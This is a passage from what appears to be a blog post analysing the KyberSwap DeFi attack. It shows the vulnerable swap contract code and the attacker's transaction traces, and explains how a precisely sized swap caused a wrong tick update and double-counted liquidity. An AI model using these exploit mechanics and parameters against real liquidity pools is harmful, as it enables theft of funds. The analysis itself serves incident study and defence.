class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">swap</span>(<span class="params"></span></span><br><span class="line"><span class="params">  address recipient,</span></span><br><span class="line"><span class="params">  int256 swapQty,</span></span><br><span class="line"><span class="params">  bool isToken0,</span></span><br><span class="line"><span class="params">  uint160 limitSqrtP,</span></span><br><span class="line"><span class="params">  bytes calldata data</span></span><br><span class="line"><span class="params"></span>) external <span class="keyword">override</span> lock returns (int256 deltaQty0, int256 deltaQty1) &#123;</span><br><span class="line">  <span class="built_in">require</span>(swapQty != <span class="number">0</span>, <span class="string">&#x27;0 swapQty&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="title class_">SwapData</span> memory swapData;</span><br><span class="line">  swapData.<span class="property">specifiedAmount</span> = swapQty;</span><br><span class="line">  swapData.<span class="property">isToken0</span> = isToken0;</span><br><span class="line">  swapData.<span class="property">isExactInput</span> = swapData.<span class="property">specifiedAmount</span> &gt; <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// tick (token1Qty/token0Qty) will increase for swapping from token1 to token0</span></span><br><span class="line">  bool willUpTick = (swapData.<span class="property">isExactInput</span> != isToken0);</span><br><span class="line">  (</span><br><span class="line">    swapData.<span class="property">baseL</span>,</span><br><span class="line">    swapData.<span class="property">reinvestL</span>,</span><br><span class="line">    swapData.<span class="property">sqrtP</span>,</span><br><span class="line">    swapData.<span class="property">currentTick</span>,  <span class="comment">// 110,909</span></span><br><span class="line">    swapData.<span class="property">nextTick</span>      <span class="comment">// 111,310</span></span><br><span class="line">  ) = <span class="title function_">_getInitialSwapData</span>(willUpTick);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">while</span> (swapData.<span class="property">specifiedAmount</span> != <span class="number">0</span> &amp;&amp; swapData.<span class="property">sqrtP</span> != limitSqrtP) &#123;</span><br><span class="line">    <span class="comment">// math calculations work with the assumption that the price diff is capped to 5%</span></span><br><span class="line">    <span class="comment">// since tick distance is uncapped between currentTick and nextTick</span></span><br><span class="line">    <span class="comment">// we use tempNextTick to satisfy our assumption with MAX_TICK_DISTANCE is set to be matched this condition</span></span><br><span class="line"></span><br><span class="line">    int24 tempNextTick = swapData.<span class="property">nextTick</span>;</span><br><span class="line"></span><br><span class="line">    swapData.<span class="property">startSqrtP</span> = swapData.<span class="property">sqrtP</span>;</span><br><span class="line">    swapData.<span class="property">nextSqrtP</span> = <span class="title class_">TickMath</span>.<span class="title function_">getSqrtRatioAtTick</span>(tempNextTick);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// local scope for targetSqrtP, usedAmount, returnedAmount and deltaL</span></span><br><span class="line">    &#123;</span><br><span class="line">      (usedAmount, returnedAmount, deltaL, swapData.<span class="property">sqrtP</span>) = <span class="title class_">SwapMath</span>.<span class="title function_">computeSwapStep</span>(</span><br><span class="line">        swapData.<span class="property">baseL</span> + swapData.<span class="property">reinvestL</span>,</span><br><span class="line">        swapData.<span class="property">sqrtP</span>,</span><br><span class="line">        targetSqrtP,</span><br><span class="line">        swapFeeUnits,</span><br><span class="line">        swapData.<span class="property">specifiedAmount</span>,</span><br><span class="line">        swapData.<span class="property">isExactInput</span>,</span><br><span class="line">        swapData.<span class="property">isToken0</span></span><br><span class="line">      );</span><br><span class="line"></span><br><span class="line">      swapData.<span class="property">specifiedAmount</span> -= usedAmount;</span><br><span class="line">      swapData.<span class="property">returnedAmount</span> += returnedAmount;</span><br><span class="line">      swapData.<span class="property">reinvestL</span> += deltaL.<span class="title function_">toUint128</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if price has not reached the next sqrt price</span></span><br><span class="line">    <span class="keyword">if</span> (swapData.<span class="property">sqrtP</span> != swapData.<span class="property">nextSqrtP</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (swapData.<span class="property">sqrtP</span> != swapData.<span class="property">startSqrtP</span>) &#123;</span><br><span class="line">        <span class="comment">// update the current tick data in case the sqrtP has changed</span></span><br><span class="line">        swapData.<span class="property">currentTick</span> = <span class="title class_">TickMath</span>.<span class="title function_">getTickAtSqrtRatio</span>(swapData.<span class="property">sqrtP</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    (swapData.<span class="property">baseL</span>, swapData.<span class="property">nextTick</span>) = <span class="title function_">_updateLiquidityAndCrossTick</span>(</span><br><span class="line">      swapData.<span class="property">nextTick</span>,</span><br><span class="line">      swapData.<span class="property">baseL</span>,</span><br><span class="line">      cache.<span class="property">feeGrowthGlobal</span>,</span><br><span class="line">      cache.<span class="property">secondsPerLiquidityGlobal</span>,</span><br><span class="line">      willUpTick</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">_updatePoolData</span>(</span><br><span class="line">    swapData.<span class="property">baseL</span>,</span><br><span class="line">    swapData.<span class="property">reinvestL</span>,</span><br><span class="line">    swapData.<span class="property">sqrtP</span>,</span><br><span class="line">    swapData.<span class="property">currentTick</span>,</span><br><span class="line">    swapData.<span class="property">nextTick</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>When the <code>swap</code> function reaches line 37, it calls <code>SwapMath.computeSwapStep</code> to update the current exchanged quantity (usedAmount), the number of tokens needed to be sent to the user (returnedAmount), the fee (deltaL), and the exchange price (swapData.sqrtP). Within <code>SwapMath.computeSwapStep</code>, the maximum exchangeable amount within the current Tick range is calculated. Monitoring the transaction reveals that the computed maximum value is 387170294533120000000, which is just one unit higher than the amount the user requested for the exchange. This indicates that the pool deems the liquidity within the Tick range [110909, 111310] sufficient to meet the attacker’s requirements, and there will be no need to cross over to the next Tick at 111310 for the exchange. As a result, <code>swapData.sqrtP</code> is updated to 20693058119558072255665971001964, a price that exceeds the price at Tick 111310 calculated in the first step, which was 20693058119558072255662180724088.</li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;msg.sender&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;func&quot;</span><span class="punctuation">:</span> <span class="string">&quot;computeSwapStep&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;liquidity&quot;</span><span class="punctuation">:</span> <span class="string">&quot;74694598994958027329&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;currentSqrtP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20282409603651670423947251286016&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;targetSqrtP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20693058119558072255662180724088&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;feeInFeeUnits&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;specifiedAmount&quot;</span><span class="punctuation">:</span> <span class="string">&quot;387170294533119999999&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;isExactInput&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;isToken0&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;return&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;usedAmount&quot;</span><span class="punctuation">:</span> <span class="string">&quot;387170294533119999999&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;returnedAmount&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-5789927137555358&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;deltaL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;75619198150999&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;nextSqrtP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20693058119558072255665971001964&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><p>Returning to lines 53-56 of the <code>swap</code> function, since the calculated <code>sqrtP</code> from step 2 did not equal <code>nextSqrtP</code>, the if-statement evaluated to true. As a consequence, the wrong price was used to calculate the incorrect currentTick, which turns out to be 111310, whereas the actual currentTick should be 110909 as calculated in the first step. The break statement at line 67 made the while loop exit and the ‘Cross Tick’ operation at line 61 was skipped. This means that even though the pool’s state has effectively ‘crossed a tick,’ the liquidity deduction operation that should have taken place at line 61 is bypassed. The key question here is: Why didn’t the calculated <code>sqrtP</code> match the <code>nextSqrtP</code> (the price at Tick 111310)? The reason for this discrepancy is explored in the ## Vulnerability Analysis ## section.</p>
+</li>
+<li><p>Continuing execution to line 70 of the <code>swap</code> function, the pool’s state is updated. However, due to the incorrect calculation of the currentTick in step 3, after the state updated, both the pool’s currentTick and nextTick were erroneously set to 111310. This incorrect state will have significant implications during the attacker’s second swap transaction. In this flawed state, when the attacker conducted the reverse swap, the liquidity that should have been removed during the first swap (because of the tick crossing) was not removed. Instead, because the state erroneously reflected that the currentTick and nextTick are the same, the liquidity was effectively added back into the pool when the reverse swap took place. This resulted in a doubling of the liquidity addition.</p>
+</li>
+</ol>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;msg.sender&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;func&quot;</span><span class="punctuation">:</span> <span class="string">&quot;_updatePoolData&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;baseL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;74692747583654757908&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;reinvestL&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1927030501420420&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sqrtP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;20693058119558072255665971001964&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;currentTick&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111310&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;nextTick&quot;</span><span class="punctuation">:</span> <span class="string">&quot;111310&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;return&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>[The second swap]</strong></p>
+<p>The attacker called the vulnerable contract’s <code>swap</code> function once again, this time with the opposite direction of the previous transaction, exchanging frxETH for WETH. The attacker used approximately 0.0059 frxETH to obtain 396.24 WETH. The parameters inputted by the attacker are as follows, and as mentioned earlier, before this call, both the pool’s currentTick and nextTick were at 111310. The pool’s state has already crossed Tick to 111310 during the previous swap, but liquidity was not deducted.</p>
+<p>In this swap, the pool undergoes another cross-tick event, and liquidity was added instead of being deducted, which is equivalent to counting the liquidity twice. The pool believes it has more liquidity than it actually does. This is why, compared to the previous swap, the attacker was able to exchange significantly less frxETH for significantly more WETH.</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;msg.sender&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;func&quot;</span><span class="punctuation">:</span> <span class="string">&quot;swap&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;recipient&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;swapQty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-396244493223555299358&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;isToken0&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;limitSqrtP&quot;</span><span class="punctuation">:</span> <span class="string">&quot;4295128740&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;return&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;deltaQty0&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5868809110205016&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;deltaQty1&quot;</span><span class="punctuation">:</span> <span class="string">&quot;-396244493223555299358&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/28/KyberSwap-Attack-Analysis-Unveiling-the-Most-Sophisticated-Cyber-Heist-in-History/03.png" alt="image"><center><i>The liquidity change of the second swap (<a href="https://explorer.phalcon.xyz/tx/eth/0x485e08dc2b6a4b3aeadcb89c3d18a37666dc7d9424961a2091d6b3696792f0f3" target="_blank" rel="noopener">https://explorer.phalcon.xyz/tx/eth/0x485e08dc2b6a4b3aeadcb89c3d18a37666dc7d9424961a2091d6b3696792f0f3</a>)</i></center></p>
+<h1 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h1><p>In this section, we will use the attacker’s trace, combined with contract simulation, to investigate why the first exchange caused an incorrect update of the pool’s state.</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// _getInitialSwapData</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  msg.sender<span class="punctuation">:</span><span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">    func<span class="punctuation">:</span><span class="string">&quot;_getInitialSwapData&quot;</span><span class="punctuation">,</span></span><br><span class="line">    args<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    willUpTick<span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  return<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    baseL<span class="punctuation">:</span><span class="string">&quot;74,692,747,583,654,757,908&quot;</span><span class="punctuation">,</span></span><br><span class="line">    reinvestL<span class="punctuation">:</span><span class="string">&quot;1,851,411,303,269,421&quot;</span><span class="punctuation">,</span></span><br><span class="line">    sqrtP<span class="punctuation">:</span><span class="string">&quot;20,282,409,603,651,670,423,947,251,286,016&quot;</span><span class="punctuation">,</span></span><br><span class="line">    currentTick<span class="punctuation">:</span><span class="string">&quot;110,909&quot;</span><span class="punctuation">,</span></span><br><span class="line">    nextTick<span class="punctuation">:</span><span class="string">&quot;111,310&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// computeSwapStep: update usedAmount, returnedAmount, fee(deltaL)and the price(swapData.sqrtP)</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  msg.sender<span class="punctuation">:</span><span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">  func<span class="punctuation">:</span><span class="string">&quot;computeSwapStep&quot;</span><span class="punctuation">,</span></span><br><span class="line">  args<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    liquidity<span class="punctuation">:</span><span class="string">&quot;74,694,598,994,958,027,329&quot;</span><span class="punctuation">,</span></span><br><span class="line">    currentSqrtP<span class="punctuation">:</span><span class="string">&quot;20,282,409,603,651,670,423,947,251,286,016&quot;</span><span class="punctuation">,</span></span><br><span class="line">    targetSqrtP<span class="punctuation">:</span><span class="string">&quot;20,693,058,119,558,072,255,662,180,724,088&quot;</span><span class="punctuation">,</span></span><br><span class="line">    feeInFeeUnits<span class="punctuation">:</span><span class="string">&quot;10&quot;</span><span class="punctuation">,</span></span><br><span class="line">    specifiedAmount<span class="punctuation">:</span><span class="string">&quot;387,170,294,533,119,999,999&quot;</span><span class="punctuation">,</span></span><br><span class="line">    isExactInput<span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    isToken0<span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  return<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    usedAmount<span class="punctuation">:</span><span class="string">&quot;387,170,294,533,119,999,999&quot;</span><span class="punctuation">,</span></span><br><span class="line">    returnedAmount<span class="punctuation">:</span><span class="string">&quot;-5,789,927,137,555,358&quot;</span><span class="punctuation">,</span></span><br><span class="line">    deltaL<span class="punctuation">:</span><span class="string">&quot;75,619,198,150,999&quot;</span><span class="punctuation">,</span></span><br><span class="line">    nextSqrtP<span class="punctuation">:</span><span class="string">&quot;20,693,058,119,558,072,255,665,971,001,964&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// calcReachAmount</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  msg.sender<span class="punctuation">:</span><span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">  func<span class="punctuation">:</span><span class="string">&quot;calcReachAmount&quot;</span><span class="punctuation">,</span></span><br><span class="line">  args<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    liquidity<span class="punctuation">:</span><span class="string">&quot;74,694,598,994,958,027,329&quot;</span><span class="punctuation">,</span></span><br><span class="line">    currentSqrtP<span class="punctuation">:</span><span class="string">&quot;20,282,409,603,651,670,423,947,251,286,016&quot;</span><span class="punctuation">,</span></span><br><span class="line">    targetSqrtP<span class="punctuation">:</span><span class="string">&quot;20,693,058,119,558,072,255,662,180,724,088&quot;</span><span class="punctuation">,</span></span><br><span class="line">    feeInFeeUnits<span class="punctuation">:</span><span class="string">&quot;10&quot;</span><span class="punctuation">,</span></span><br><span class="line">    isExactInput<span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    isToken0<span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  return<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    reachAmount<span class="punctuation">:</span><span class="string">&quot;387,170,294,533,120,000,000&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// calcFinalPrice</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  msg.sender<span class="punctuation">:</span><span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">  func<span class="punctuation">:</span><span class="string">&quot;calcFinalPrice&quot;</span><span class="punctuation">,</span></span><br><span class="line">  args<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    absDelta<span class="punctuation">:</span><span class="string">&quot;387,170,294,533,119,999,999&quot;</span><span class="punctuation">,</span></span><br><span class="line">    liquidity<span class="punctuation">:</span><span class="string">&quot;74,694,598,994,958,027,329&quot;</span><span class="punctuation">,</span></span><br><span class="line">    deltaL<span class="punctuation">:</span><span class="string">&quot;75,619,198,150,999&quot;</span><span class="punctuation">,</span></span><br><span class="line">    currentSqrtP<span class="punctuation">:</span><span class="string">&quot;20,282,409,603,651,670,423,947,251,286,016&quot;</span><span class="punctuation">,</span></span><br><span class="line">    isExactInput<span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    isToken0<span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  return<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    out0<span class="punctuation">:</span><span class="string">&quot;20,693,058,119,558,072,255,665,971,001,964&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// _updatePoolData</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  msg.sender<span class="punctuation">:</span><span class="string">&quot;0xaf2acf3d4ab78e4c702256d214a3189a874cdc13&quot;</span><span class="punctuation">,</span></span><br><span class="line">  func<span class="punctuation">:</span><span class="string">&quot;_updatePoolData&quot;</span><span class="punctuation">,</span></span><br><span class="line">    args<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    baseL<span class="punctuation">:</span><span class="string">&quot;74,692,747,583,654,757,908&quot;</span><span class="punctuation">,</span></span><br><span class="line">    reinvestL<span class="punctuation">:</span><span class="string">&quot;1,927,030,501,420,420&quot;</span><span class="punctuation">,</span></span><br><span class="line">    sqrtP<span class="punctuation">:</span><span class="string">&quot;20,693,058,119,558,072,255,665,971,001,964&quot;</span><span class="punctuation">,</span></span><br><span class="line">    currentTick<span class="punctuation">:</span><span class="string">&quot;111,310&quot;</span><span class="punctuation">,</span></span><br><span class="line">    nextTick<span class="punctuation">:</span><span class="string">&quot;111,310&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  return<span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">swap</span>(<span class="params"></span></span><br><span class="line"><span class="params">  address recipient,</span></span><br><span class="line"><span class="params">  int256 swapQty,</span></span><br><span class="line"><span class="params">  bool isToken0,</span></span><br><span class="line"><span class="params">  uint160 limitSqrtP,</span></span><br><span class="line"><span class="params">  bytes calldata data</span></span><br><span class="line"><span class="params"></span>) external <span class="keyword">override</span> lock returns (int256 deltaQty0, int256 deltaQty1) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">while</span> (swapData.<span class="property">specifiedAmount</span> != <span class="number">0</span> &amp;&amp; swapData.<span class="property">sqrtP</span> != limitSqrtP) &#123;</span><br><span class="line">    (usedAmount, returnedAmount, deltaL, swapData.<span class="property">sqrtP</span>) = <span class="title class_">SwapMath</span>.<span class="title function_">computeSwapStep</span>(</span><br><span class="line">      swapData.<span class="property">baseL</span> + swapData.<span class="property">reinvestL</span>,</span><br><span class="line">      swapData.<span class="property">sqrtP</span>,</span><br><span class="line">      targetSqrtP,</span><br><span class="line">      swapFeeUnits,</span><br><span class="line">      swapData.<span class="property">specifiedAmount</span>,</span><br><span class="line">      swapData.<span class="property">isExactInput</span>,</span><br><span class="line">      swapData.<span class="property">isToken0</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// if price has not reached the next sqrt price</span></span><br><span class="line">    <span class="keyword">if</span> (swapData.<span class="property">sqrtP</span> != swapData.<span class="property">nextSqrtP</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (swapData.<span class="property">sqrtP</span> != swapData.<span class="property">startSqrtP</span>) &#123;</span><br><span class="line">        <span class="comment">// update the current tick data in case the sqrtP has changed</span></span><br><span class="line">        swapData.<span class="property">currentTick</span> = <span class="title class_">TickMath</span>.<span class="title function_">getTickAtSqrtRatio</span>(swapData.<span class="property">sqrtP</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span 